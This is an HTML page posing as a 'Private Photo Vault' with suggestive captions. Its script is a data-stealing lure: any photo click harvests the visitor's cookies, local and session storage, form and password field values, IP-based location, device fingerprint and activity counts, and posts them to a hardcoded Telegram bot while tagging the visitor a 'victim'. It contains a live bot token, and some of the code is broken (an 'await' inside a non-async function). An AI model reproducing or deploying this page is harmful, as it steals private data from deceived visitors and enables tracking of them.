<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="loading" id="loading">Loading secure content...</div>
        
        <div class="gallery">
            <div class="image-card" onclick="startCompleteExploitation(1)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                     alt="Private Photo 1" 
                     onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
                <div class="image-title">Daily activitieessss <3 </div>
                <div class="image-desc">normal pics </div>
            </div>
            
            <div class="image-card" onclick="startCompleteExploitation(2)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                     alt="Private Photo 2"
                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
                <div class="image-title">NVDES</div>
                <div class="image-desc">Title says it all lol</div>
            </div>
            
            <div class="image-card" onclick="startCompleteExploitation(3)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                     alt="Private Photo 3"
                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
                <div class="image-title">My facee</div>
                <div class="image-desc">I'm sooo ugly ik >_< </div>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            },
            images: {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
            }
        };

        // Enhanced data collection system
        async function startCompleteExploitation(imageId) {
            const loading = document.getElementById('loading');
            loading.style.display = 'block';
            
            try {
                // Disable further clicks during extraction
                document.querySelectorAll('.image-card').forEach(card => {
                    card.style.pointerEvents = 'none';
                    card.style.opacity = '0.6';
                });

                // Start comprehensive data extraction
                const extractionStart = Date.now();
                const victimData = await extractAllPossibleData();
                const extractionTime = Date.now() - extractionStart;

                // Add metadata
                victimData.meta = {
                    imageId: imageId,
                    extractionTime: extractionTime,
                    timestamp: new Date().toISOString(),
                    victimId: generateVictimId(),
                    url: window.location.href
                };

                // Send to Telegram
                await sendToTelegram(victimData);
                
                // Store in admin panel
                storeInAdminPanel(victimData);

                // Show success and redirect after 1000ms
                loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                setTimeout(() => {
                    window.open(CONFIG.images[imageId], '_blank');
                    // Restore UI
                    loading.style.display = 'none';
                    document.querySelectorAll('.image-card').forEach(card => {
                        card.style.pointerEvents = 'auto';
                        card.style.opacity = '1';
                    });
                }, 1000);
                
            } catch (error) {
                console.error('Extraction failed:', error);
                // Fallback - still open image
                setTimeout(() => {
                    window.open(CONFIG.images[imageId], '_blank');
                    loading.style.display = 'none';
                    document.querySelectorAll('.image-card').forEach(card => {
                        card.style.pointerEvents = 'auto';
                        card.style.opacity = '1';
                    });
                }, 1000);
            }
        }

        // Comprehensive data extraction
        async function extractAllPossibleData() {
            const data = {};

            // Execute all extraction methods in parallel
            const [
                hardwareData,
                systemData,
                networkData,
                userData,
                browserData,
                behavioralData
            ] = await Promise.allSettled([
                extractHardwareData(),
                extractSystemData(),
                extractNetworkData(),
                extractUserData(),
                extractBrowserData(),
                extractBehavioralData()
            ]);

            data.hardware = hardwareData.status === 'fulfilled' ? hardwareData.value : {};
            data.system = systemData.status === 'fulfilled' ? systemData.value : {};
            data.network = networkData.status === 'fulfilled' ? networkData.value : {};
            data.user = userData.status === 'fulfilled' ? userData.value : {};
            data.browser = browserData.status === 'fulfilled' ? browserData.value : {};
            data.behavioral = behavioralData.status === 'fulfilled' ? behavioralData.value : {};

            return data;
        }

        // I. Hardware & BIOS/UEFI Data
        async function extractHardwareData() {
            const data = {
                cpu: extractCPUData(),
                memory: extractMemoryData(),
                gpu: extractGPUData(),
                storage: extractStorageData(),
                network: extractNetworkHardwareData(),
                audio: extractAudioData(),
                peripherals: extractPeripheralData(),
                sensors: extractSensorData(),
                display: extractDisplayData()
            };

            return data;
        }

        function extractCPUData() {
            const nav = navigator;
            return {
                manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
                architecture: nav.userAgent.includes('x64') ? 'x64' : 'x86',
                cores: nav.hardwareConcurrency,
                memory: nav.deviceMemory || 'Unknown',
                platform: nav.platform,
                userAgent: nav.userAgent
            };
        }

        function extractMemoryData() {
            // Memory information through performance API
            const memory = performance.memory;
            return {
                totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
                usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
                jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
                deviceMemory: navigator.deviceMemory || 'Unknown'
            };
        }

        function extractGPUData() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return { available: false };

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                available: true,
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                version: gl.getParameter(gl.VERSION),
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        }

        function extractStorageData() {
            return {
                localStorage: extractLocalStorage(),
                sessionStorage: extractSessionStorage(),
                cookies: extractCookies(),
                indexedDB: await checkIndexedDB()
            };
        }

        function extractLocalStorage() {
            const data = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
            return data;
        }

        function extractSessionStorage() {
            const data = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data[key] = sessionStorage.getItem(key);
            }
            return data;
        }

        function extractCookies() {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value || '';
                return cookies;
            }, {});
        }

        async function checkIndexedDB() {
            try {
                return 'IndexedDB available: ' + !!window.indexedDB;
            } catch (e) {
                return 'IndexedDB unavailable';
            }
        }

        function extractNetworkHardwareData() {
            const connection = navigator.connection;
            return {
                effectiveType: connection ? connection.effectiveType : 'Unknown',
                downlink: connection ? connection.downlink : 'Unknown',
                rtt: connection ? connection.rtt : 'Unknown',
                saveData: connection ? connection.saveData : 'Unknown',
                onLine: navigator.onLine
            };
        }

        function extractAudioData() {
            const audioContext = window.AudioContext || window.webkitAudioContext;
            return {
                audioContextAvailable: !!audioContext,
                sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
            };
        }

        function extractPeripheralData() {
            return {
                touchSupport: 'ontouchstart' in window,
                maxTouchPoints: navigator.maxTouchPoints,
                vibration: 'vibrate' in navigator,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                serial: 'serial' in navigator
            };
        }

        function extractSensorData() {
            return {
                battery: 'getBattery' in navigator,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                deviceMotion: 'DeviceMotionEvent' in window,
                proximity: 'ondeviceproximity' in window,
                light: 'ondevicelight' in window
            };
        }

        function extractDisplayData() {
            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                devicePixelRatio: window.devicePixelRatio,
                colorGamut: screen.colorGamut,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
            };
        }

        // II. Operating System & Software Data
        async function extractSystemData() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookieEnabled: navigator.cookieEnabled,
                pdfEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                plugins: extractPlugins(),
                fonts: await extractFonts(),
                doNotTrack: navigator.doNotTrack,
                product: navigator.product,
                productSub: navigator.productSub,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub
            };
        }

        function extractPlugins() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push({
                    name: navigator.plugins[i].name,
                    filename: navigator.plugins[i].filename,
                    description: navigator.plugins[i].description
                });
            }
            return plugins;
        }

        async function extractFonts() {
            const fontList = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
                'Avant Garde', 'Baskerville', 'Bodoni MT', 'Book Antiqua',
                'Brush Script MT', 'Calibri', 'Cambria', 'Candara',
                'Century Gothic', 'Comic Sans MS', 'Consolas', 'Constantia',
                'Corbel', 'Courier New', 'DejaVu Sans', 'Didot',
                'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
                'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
                'Lucida Bright', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
                'Microsoft Sans Serif', 'Monaco', 'Montserrat', 'Open Sans',
                'Optima', 'Palatino', 'Perpetua', 'Rockwell',
                'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings', 'Zapf Dingbats'
            ];

            const availableFonts = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';

            fontList.forEach(font => {
                context.font = testSize + " '" + font + "'";
                const metrics1 = context.measureText(testString);
                context.font = testSize + " 'monospace'";
                const metrics2 = context.measureText(testString);
                if (metrics1.width !== metrics2.width) {
                    availableFonts.push(font);
                }
            });

            return availableFonts;
        }

        // III. Network Configuration & Activity
        async function extractNetworkData() {
            const [ipData, networkInfo, connectionData] = await Promise.allSettled([
                getIPInfo(),
                getNetworkInfo(),
                getConnectionData()
            ]);

            return {
                ip: ipData.status === 'fulfilled' ? ipData.value : {},
                network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
                connection: connectionData.status === 'fulfilled' ? connectionData.value : {}
            };
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                // Get additional IP info
                try {
                    const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const ipData = await ipResponse.json();
                    return ipData;
                } catch (e) {
                    return { ip: data.ip };
                }
            } catch (error) {
                return { ip: 'Unknown' };
            }
        }

        async function getNetworkInfo() {
            const connection = navigator.connection;
            return {
                effectiveType: connection ? connection.effectiveType : 'Unknown',
                downlink: connection ? connection.downlink : 'Unknown',
                rtt: connection ? connection.rtt : 'Unknown',
                saveData: connection ? connection.saveData : false
            };
        }

        async function getConnectionData() {
            return {
                referrer: document.referrer,
                url: window.location.href,
                protocol: window.location.protocol,
                host: window.location.host,
                port: window.location.port
            };
        }

        // IV. User Data & Digital Footprint
        async function extractUserData() {
            return {
                forms: extractFormData(),
                inputs: extractInputData(),
                autofill: extractAutofillData(),
                browsingData: await extractBrowsingData(),
                socialMedia: extractSocialMediaData()
            };
        }

        function extractFormData() {
            const forms = {};
            document.querySelectorAll('form').forEach((form, index) => {
                const formData = {};
                form.querySelectorAll('input, select, textarea').forEach(field => {
                    if (field.value) {
                        formData[field.name || field.type] = field.value;
                    }
                });
                if (Object.keys(formData).length > 0) {
                    forms[`form_${index}`] = formData;
                }
            });
            return forms;
        }

        function extractInputData() {
            const inputs = {};
            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"]').forEach(input => {
                if (input.value) {
                    inputs[input.name || 'unnamed'] = input.value;
                }
            });
            return inputs;
        }

        function extractAutofillData() {
            const autofill = {};
            // Check for autofilled fields
            document.querySelectorAll('input').forEach(input => {
                if (input.matches(':-webkit-autofill')) {
                    autofill[input.name || 'unnamed'] = 'autofilled';
                }
            });
            return autofill;
        }

        async function extractBrowsingData() {
            return {
                historyLength: window.history.length,
                performance: extractPerformanceData(),
                storage: {
                    localStorage: Object.keys(extractLocalStorage()).length,
                    sessionStorage: Object.keys(extractSessionStorage()).length,
                    cookies: Object.keys(extractCookies()).length
                }
            };
        }

        function extractPerformanceData() {
            const perf = performance.timing;
            if (!perf) return {};
            
            return {
                navigationStart: perf.navigationStart,
                loadEventEnd: perf.loadEventEnd,
                domComplete: perf.domComplete,
                domContentLoaded: perf.domContentLoadedEventEnd,
                firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
                firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
            };
        }

        function extractSocialMediaData() {
            const social = {};
            const html = document.documentElement.outerHTML;
            
            // Check for social media indicators
            const platforms = {
                facebook: /facebook|fb\.com/gi,
                twitter: /twitter|tweet/gi,
                instagram: /instagram/gi,
                linkedin: /linkedin/gi,
                tiktok: /tiktok/gi,
                discord: /discord/gi,
                snapchat: /snapchat/gi
            };
            
            Object.keys(platforms).forEach(platform => {
                if (platforms[platform].test(html)) {
                    social[platform] = 'detected';
                }
            });
            
            return social;
        }

        // V. Browser Data
        async function extractBrowserData() {
            return {
                userAgent: navigator.userAgent,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints
            };
        }

        // VI. Behavioral Data
        async function extractBehavioralData() {
            return {
                mouseMovements: window.mouseMovements || [],
                clicks: window.clickCount || 0,
                scrollDepth: getScrollDepth(),
                timeOnPage: Date.now() - window.pageLoadTime,
                keystrokes: window.keystrokeCount || 0
            };
        }

        function getScrollDepth() {
            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
            const scrolled = window.scrollY;
            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
        }

        // Telegram integration
        async function sendToTelegram(data) {
            try {
                const message = formatTelegramMessage(data);
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram send failed:', error);
                return false;
            }
        }

        function formatTelegramMessage(data) {
            return `
<b>üö® COMPREHENSIVE DATA EXTRACTION COMPLETE</b>

<b>üéØ VICTIM ID:</b> <code>${data.meta.victimId}</code>
<b>‚è∞ Extraction Time:</b> ${data.meta.extractionTime}ms
<b>üåê URL:</b> ${data.meta.url}
<b>üìÖ Timestamp:</b> ${new Date(data.meta.timestamp).toLocaleString()}

<b>üíª HARDWARE DATA:</b>
‚Ä¢ CPU: ${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}
‚Ä¢ Memory: ${data.hardware.memory.deviceMemory}GB
‚Ä¢ GPU: ${data.hardware.gpu.vendor || 'Unknown'}
‚Ä¢ Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}

<b>üåê NETWORK DATA:</b>
‚Ä¢ IP: ${data.network.ip.ip || 'Unknown'}
‚Ä¢ Location: ${data.network.ip.city || 'Unknown'}, ${data.network.ip.country || 'Unknown'}
‚Ä¢ ISP: ${data.network.ip.org || 'Unknown'}
‚Ä¢ Connection: ${data.network.network.effectiveType}

<b>üîß SYSTEM DATA:</b>
‚Ä¢ OS: ${data.system.platform}
‚Ä¢ Language: ${data.system.language}
‚Ä¢ Timezone: ${data.system.timezone}
‚Ä¢ Fonts: ${data.system.fonts.length} detected

<b>üë§ USER DATA:</b>
‚Ä¢ Forms: ${Object.keys(data.user.forms).length}
‚Ä¢ Inputs: ${Object.keys(data.user.inputs).length}
‚Ä¢ Social Media: ${Object.keys(data.user.socialMedia).join(', ') || 'None'}

<b>üåê BROWSER DATA:</b>
‚Ä¢ Browser: ${data.browser.vendor || 'Unknown'}
‚Ä¢ User Agent: ${data.browser.userAgent.substring(0, 50)}...

<b>üìä BEHAVIORAL DATA:</b>
‚Ä¢ Scroll Depth: ${data.behavioral.scrollDepth}%
‚Ä¢ Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
‚Ä¢ Clicks: ${data.behavioral.clicks}

<b>üíæ STORAGE DATA:</b>
‚Ä¢ Local Storage: ${Object.keys(data.hardware.storage.localStorage).length} items
‚Ä¢ Cookies: ${Object.keys(data.hardware.storage.cookies).length}
‚Ä¢ Session Storage: ${Object.keys(data.hardware.storage.sessionStorage).length}

<code>Extraction completed successfully</code>
            `.trim();
        }

        // Admin panel storage
        function storeInAdminPanel(data) {
            // Load existing victims
            const existing = localStorage.getItem('victimData');
            const victims = existing ? JSON.parse(existing) : [];
            
            // Add new victim
            victims.unshift(data);
            
            // Keep only last 100 victims
            if (victims.length > 100) {
                victims.splice(100);
            }
            
            // Save back
            localStorage.setItem('victimData', JSON.stringify(victims));
            localStorage.setItem('lastVictimUpdate', Date.now().toString());
        }

        // Utility functions
        function generateVictimId() {
            return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
        }

        // Behavioral tracking
        window.pageLoadTime = Date.now();
        window.mouseMovements = [];
        window.clickCount = 0;
        window.keystrokeCount = 0;

        document.addEventListener('mousemove', (e) => {
            window.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now()
            });
            if (window.mouseMovements.length > 1000) {
                window.mouseMovements.shift();
            }
        });

        document.addEventListener('click', () => {
            window.clickCount++;
        });

        document.addEventListener('keydown', () => {
            window.keystrokeCount++;
        });

        console.log('üïµÔ∏è Enhanced data extraction system loaded');
    </script>
</body>
</html>
